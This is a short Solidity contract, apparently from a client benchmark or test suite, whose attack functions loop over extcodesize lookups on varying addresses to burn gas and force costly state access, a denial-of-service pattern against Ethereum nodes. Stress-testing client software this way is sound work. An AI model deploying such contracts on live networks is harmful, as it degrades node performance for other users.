pragma solidity ^0.8.9;

contract StateDOS {
    uint256 public dummy;

    constructor() {
        dummy = 0;
    }

    function attack() public {
        while (gasleft() > 30000) {
            assembly {
                let ignored := extcodesize(gas())
            }
        }
        //modify state a little
        dummy++;
    }

    function attackView() public view {
        while (gasleft() > 30000) {
            assembly {
                let ignored := extcodesize(gas())
            }
        }
    }
}